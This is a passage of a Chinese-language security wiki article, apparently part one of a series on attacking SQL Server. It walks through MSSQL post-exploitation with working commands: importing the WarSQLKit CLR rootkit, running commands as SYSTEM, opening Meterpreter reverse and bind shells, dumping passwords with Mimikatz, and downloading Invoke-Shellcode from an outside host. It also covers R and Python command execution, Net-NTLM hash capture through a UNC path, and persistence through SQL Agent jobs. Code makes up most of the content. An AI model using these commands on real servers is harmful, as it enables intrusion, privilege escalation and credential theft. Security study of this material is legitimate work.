+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-36.png"></p>
+<h3 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h3><p>WarSQLKit是一个针对MSSQL CLR进行利用的工具，有以下两个版本。</p>
+<ul>
+<li>WarSQLKit是完全版本，内置多种功能。</li>
+<li>WarSQLKitMinimal是迷你版，只能执行命令。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</span><br></pre></td></tr></table></figure>
+
+<h3 id="导入WarSQLKit-DLL文件"><a href="#导入WarSQLKit-DLL文件" class="headerlink" title="导入WarSQLKit DLL文件"></a>导入WarSQLKit DLL文件</h3><p>利用16进制文件流方式导入WarSQLKit.dll文件。</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-37.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-38.png"></p>
+<p>创建存储过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_cmdExec</span><br><span class="line">@Command [nvarchar](max)</span><br><span class="line">WITH EXECUTE AS CALLER</span><br><span class="line">AS</span><br><span class="line">EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-39.png"></p>
+<h3 id="WarSQLKit-执行命令"><a href="#WarSQLKit-执行命令" class="headerlink" title="WarSQLKit 执行命令"></a>WarSQLKit 执行命令</h3><p>WarSQLKit CmdExec实现了以下功能</p>
+<p>执行任意Windows命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-1.png"></p>
+<p>以SYSTEM权限执行Windows命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;whoami /RunSystemPriv&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-2.png"></p>
+<p>以SYSTEM权限运行PowerShell命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;powershell Get-ChildItem /RunSystemPS&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>以SYSTEM权限运行的X86 Meterpreter反向连接shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-3.png"></p>
+<p>生成以SYSTEM权限运行的X64 Meterpreter反向连接shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>生成以SYSTEM权限运行的X64 Meterpreter RC4反向连接shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem&#x27;</span><br><span class="line">RC4PASSWORD=123456</span><br></pre></td></tr></table></figure>
+
+<p>生成以SYSTEM权限运行的X86 Meterpreter_bind_tcp shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_bind_tcp LPORT GetSystem&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>每次使用 Meterpreter反弹都会创建一个reverse进程</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-4.png"></p>
+<p>运行Mimikatz功能抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#x27;sp_Mimikatz&#x27;;</span><br><span class="line">select * from WarSQLKitTemp //获取Mimikatz日志</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-15.png"></p>
+<p>文件下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_downloadFile http://test.com/Invoke--Shellcode.ps1 C:\test\Invoke--Shellcode.ps1 300&#x27;;</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_downloadFile http://10.251.0.33/Invoke--Shellcode.ps1 C:\test\Invoke--Shellcode.ps1 300&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-14.png"></p>
+<p>获取MSSQL Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_getSqlHash&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-5.png"></p>
+<p>获取Windows Product</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_getProduct&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-6.png"></p>
+<p>获取可用的数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_getDatabases&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-7.png"></p>
+<h2 id="SQL-Server-R和Python的利用"><a href="#SQL-Server-R和Python的利用" class="headerlink" title="SQL Server R和Python的利用"></a>SQL Server R和Python的利用</h2><p>MSSQL 2017加入了Microsoft机器学习服务，该服务允许通过MSSQL中<code>sp_execute_external_script</code>执行Python和R脚本</p>
+<p>利用条件：</p>
+<ul>
+<li><p>Machine Learning Services必须要在Python安装过程中选择</p>
+</li>
+<li><p>必须启用外部脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;external scripts enabled&#x27;, 1</span><br><span class="line">RECONFIGURE WITH OVERRIDE</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>重新启动数据库服务器</li>
+</ul>
+</li>
+<li><p>用户拥有执行任何外部脚本权限</p>
+</li>
+</ul>
+<h3 id="R脚本利用"><a href="#R脚本利用" class="headerlink" title="R脚本利用"></a>R脚本利用</h3><p>利用R执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;external scripts enabled&#x27;</span><br><span class="line">GO</span><br><span class="line">EXEC sp_execute_external_script</span><br><span class="line">@language=N&#x27;R&#x27;,</span><br><span class="line">@script=N&#x27;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe</span><br><span class="line">/c dir&quot;,intern=T))&#x27;</span><br><span class="line">WITH RESULT SETS (([cmd_out] text));</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p>利用R抓取Net-NTLM哈希：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@script=N&#x27;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a>Python脚本利用</h3><p>Python ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script </span><br><span class="line">@language =N&#x27;Python&#x27;,</span><br><span class="line">@script=N&#x27;import sys</span><br><span class="line">OutputDataSet = pandas.DataFrame([sys.version])&#x27;</span><br><span class="line">WITH RESULT SETS ((python_version nvarchar(max)))</span><br></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script </span><br><span class="line">@language =N&#x27;Python&#x27;,</span><br><span class="line">@script=N&#x27;import subprocess</span><br><span class="line">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE)</span><br><span class="line">OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#x27;</span><br><span class="line">WITH RESULT SETS (([cmd_out] nvarchar(max)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL-Server代理执行计划任务"><a href="#SQL-Server代理执行计划任务" class="headerlink" title="SQL Server代理执行计划任务"></a>SQL Server代理执行计划任务</h2><h3 id="启动SQL-Server代理服务"><a href="#启动SQL-Server代理服务" class="headerlink" title="启动SQL Server代理服务"></a>启动SQL Server代理服务</h3><p>SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务。</p>
+<p>首先启动SQL Server代理服务。</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-8.png"></p>
+<h3 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">EXEC dbo.sp_add_job @job_name = N&#x27;test_powershell_job1&#x27;; </span><br><span class="line">EXEC sp_add_jobstep @job_name = N&#x27;test_powershell_job1&#x27;, @step_name = N&#x27;test_powershell_name1&#x27;, @subsystem = N&#x27;PowerShell&#x27;, @command = N&#x27;c:\windows\system32\cmd.exe /c whoami /all &gt;c:\\123.txt&#x27;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_powershell_job1&#x27;; </span><br><span class="line">EXEC dbo.sp_start_job N&#x27;test_powershell_job1&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-9.png"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.freetds.org/">http://www.freetds.org/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></li>
+</ul>
+</blockquote>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    SQL Server数据库攻防详解下篇
+                
+            </div>
+        </a>
+    
+    
+        <a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">0-Cobalt Strike零基础</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            Tahir &copy; 2021 
+            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
